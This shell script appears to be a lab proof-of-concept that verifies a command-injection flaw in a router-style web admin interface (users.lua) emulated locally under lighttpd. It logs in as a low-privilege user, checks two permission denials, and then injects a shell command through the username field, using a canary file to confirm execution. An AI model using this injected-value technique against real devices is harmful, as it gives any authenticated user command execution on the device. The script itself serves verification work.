#!/bin/sh
set -eu

BASE=http://127.0.0.1:18082/cgi-bin
CANARY=/tmp/evo-uname-canary
AUTH=
SERVER_PID=

cleanup() {
  set +e
  rm -f "$CANARY"
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  rm -rf /opt/setup/users/1 /opt/setup/profiles/7
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

post() {
  /bin/busybox wget -qO- --post-data "$1" "$BASE/$2"
}

rm -f "$CANARY"
mkdir -p /opt/setup/users/1 /opt/setup/profiles/7
cp /lab/fixtures/restore-user-config.json /opt/setup/users/1/config.json
cp /lab/fixtures/restore-profile-config.json /opt/setup/profiles/7/config.json
cp /lab/fixtures/restore-profile-permissions.json /opt/setup/profiles/7/permissions.json
cp /lab/fixtures/restore-profile-layout.json /opt/setup/profiles/7/layout.json
touch /opt/setup/users/1/RestoreOnly /opt/setup/profiles/7/RestoreOnly
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  if /bin/busybox wget -qO- "$BASE/sysinfo.lua" >/dev/null; then
    break
  fi
  sleep 1
done

AUTH_RESPONSE=$(post 'action=authenticate&username=RestoreOnly&password=restoreprobe' api.lua)
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL low-privilege authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
echo "PASS restore-only authentication without users-edit"

OTHER=$(post "SSES=$AUTH&action=edit&context=users&id=999&settings=%7B%22config%22%3A%7B%22username%22%3A%22OtherName%22%7D%7D" users.lua) || true
case "$OTHER" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL other-user control: $OTHER"; exit 1;;
esac
[ ! -e "$CANARY" ] || { echo "FAIL other-user canary executed"; exit 1; }
echo "PASS other-user edit denied"

FORBIDDEN=$(post "SSES=$AUTH&action=edit&context=users&id=1&settings=%7B%22config%22%3A%7B%22profile%22%3A7%7D%7D" users.lua) || true
case "$FORBIDDEN" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL forbidden-field control: $FORBIDDEN"; exit 1;;
esac
echo "PASS self-edit profile change denied"

RESPONSE=$(post "SSES=$AUTH&action=edit&context=users&id=1&settings=%7B%22config%22%3A%7B%22username%22%3A%22x%5C%22%3Bid%3E%2Ftmp%2Fevo-uname-canary%3B%23%22%7D%7D" users.lua) || true
echo "self-edit response: $RESPONSE"
PROOF=$(cat "$CANARY") || { echo "FAIL self-edit command canary missing"; exit 1; }
case "$PROOF" in
  *'uid='*) ;;
  *) echo "FAIL unexpected canary output: $PROOF"; exit 1;;
esac
echo "PASS any-user self-edit username command injection: $PROOF"
rm -f "$CANARY"
[ ! -e "$CANARY" ] || { echo "FAIL canary cleanup"; exit 1; }
echo "PASS canary cleanup"
echo "overall: PASS"
